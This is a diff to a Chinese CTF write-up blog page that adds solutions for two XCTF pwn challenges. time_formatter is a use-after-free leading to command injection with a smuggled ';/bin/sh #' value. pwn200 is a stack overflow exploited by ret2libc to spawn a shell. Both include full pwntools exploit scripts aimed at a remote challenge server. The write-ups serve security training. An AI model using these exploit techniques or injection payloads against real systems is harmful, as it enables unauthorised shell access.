@@ -96,8 +96,23 @@
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check-1596184151147.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/pop.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/out-1596184509689.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check-1596351716046.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/main-1596351729913.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/11.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/1.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/12.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/2.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/3.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/4.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/5.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/free-1596352239849.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/flag.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/main-1596439355391.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/read.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check-1596439675404.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/xctf-adv/flag-1596439779690.png">
 <meta property="article:published_time" content="2020-07-24T01:25:11.000Z">
-<meta property="article:modified_time" content="2020-07-31T08:35:15.086Z">
+<meta property="article:modified_time" content="2020-08-03T07:29:42.948Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://caiii-vegtable.github.io/image/xctf-adv/check.png">
@@ -349,6 +364,48 @@
 
 <p>效果</p>
 <p><img src="/image/xctf-adv/out-1596184509689.png" alt="out"></p>
+<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h2><p>是一个堆题，UAF</p>
+<p>查看保护</p>
+<p><img src="/image/xctf-adv/check-1596351716046.png" alt="check"></p>
+<p>mian函数</p>
+<p><img src="/image/xctf-adv/main-1596351729913.png" alt="main"></p>
+<p>菜单有5个选项</p>
+<p>选项1</p>
+<p><img src="/image/xctf-adv/11.png" alt="11"></p>
+<p><img src="/image/xctf-adv/1.png" alt="1"></p>
+<p><img src="/image/xctf-adv/12.png" alt="12"></p>
+<p>strdup函数调用了malloc函数，申请了一块内存保存用户输入的时间格式字符串。</p>
+<p>选择2</p>
+<p><img src="/image/xctf-adv/2.png" alt="2"></p>
+<p>选择3</p>
+<p><img src="/image/xctf-adv/3.png" alt="3"></p>
+<p>同样申请了内存</p>
+<p>选择4</p>
+<p><img src="/image/xctf-adv/4.png" alt="4"></p>
+<p>调用system函数，command为参数</p>
+<p>选择5</p>
+<p><img src="/image/xctf-adv/5.png" alt="5"></p>
+<p><img src="/image/xctf-adv/free-1596352239849.png" alt="free"></p>
+<p>free释放了ptr和value，询问是否退出，不退出，但是指针未被置NULL。</p>
+<p>思路：先选择1，申请内存，然后选择5free掉，但是不退出。再选择3，申请内存，输入”‘;/bin/sh #”，value指向ptr指向的内存。再选择4，将value作为system的参数。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>,<span class="number">38803</span>)</span><br><span class="line"><span class="comment">#p = process('./time_formatter')</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Format: '</span>)</span><br><span class="line">p.sendline(<span class="string">'%c'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Are you sure you want to exit (y/N)? '</span>)</span><br><span class="line">p.sendline(<span class="string">'N'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Time zone: '</span>)</span><br><span class="line">p.sendline(<span class="string">"';/bin/sh #"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/xctf-adv/flag.png" alt="flag"></p>
+<h2 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h2><p>main函数</p>
+<p><img src="/image/xctf-adv/main-1596439355391.png" alt="main"></p>
+<p>sub_8048484</p>
+<p><img src="/image/xctf-adv/read.png" alt="read"></p>
+<p>可以看到明显的栈溢出。</p>
+<p>保护</p>
+<p><img src="/image/xctf-adv/check-1596439675404.png" alt="check"></p>
+<p>泄露write地址，获得libc。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./pwn200')</span></span><br><span class="line">p=remote(<span class="string">'220.249.52.133'</span>,<span class="number">49746</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./pwn200'</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr=<span class="number">0x080484be</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x70</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'~!\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x70</span>+p32(system_addr)+<span class="string">'b'</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line">p.recvuntil(<span class="string">'~!\n'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>效果</p>
+<p><img src="/image/xctf-adv/flag-1596439779690.png" alt="flag"></p>
 
       
     </div>
@@ -503,7 +560,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#攻防世界进阶区"><span class="nav-text">攻防世界进阶区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dice-game"><span class="nav-text">dice_game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-text">pwn1</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#攻防世界进阶区"><span class="nav-text">攻防世界进阶区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#dice-game"><span class="nav-text">dice_game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1"><span class="nav-text">pwn1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#time-formatter"><span class="nav-text">time_formatter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn200"><span class="nav-text">pwn200</span></a></li></ol></li></ol></div>
             
 
           </div>
